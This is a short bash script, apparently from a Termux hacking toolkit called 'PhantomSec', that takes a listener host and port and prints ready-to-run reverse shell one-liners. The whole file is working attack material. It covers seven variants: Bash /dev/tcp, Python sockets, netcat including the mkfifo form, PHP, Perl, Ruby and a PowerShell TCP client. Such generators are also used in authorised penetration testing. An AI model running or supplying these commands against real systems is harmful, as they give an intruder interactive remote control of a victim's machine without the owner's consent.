#!/usr/bin/env bash
# PhantomSec Termux — Reverse Shell Generator
# Usage: ps-revshell [lhost] [lport]

LHOST="${1:-$(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')}"
LPORT="${2:-4444}"

G='\033[0;32m' C='\033[0;36m' NC='\033[0m' BOLD='\033[1m'

echo -e "\n${G}[+] Reverse Shell Generator${NC}"
echo "  LHOST: $LHOST | LPORT: $LPORT\n"

echo -e "${BOLD}  [1] Bash${NC}"
echo "  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

echo -e "\n${BOLD}  [2] Python${NC}"
echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

echo -e "\n${BOLD}  [3] Netcat${NC}"
echo "  nc -e /bin/sh $LHOST $LPORT"
echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"

echo -e "\n${BOLD}  [4] PHP${NC}"
echo "  php -r 'exec(\"/bin/bash -c \\\"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\\"\");'"

echo -e "\n${BOLD}  [5] Perl${NC}"
echo "  perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($LPORT,inet_aton(\"$LHOST\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"

echo -e "\n${BOLD}  [6] Ruby${NC}"
echo "  ruby -rsocket -e 'TCPSocket.new(\"$LHOST\",\"$LPORT\").exec(\"/bin/sh -i\")'"

echo -e "\n${BOLD}  [7] PowerShell${NC}"
echo "  powershell -nop -c \"\$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r+='PS '+(pwd).Path+'> ';\$t=[Text.Encoding]::ASCII.GetBytes(\$r);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"

echo ""
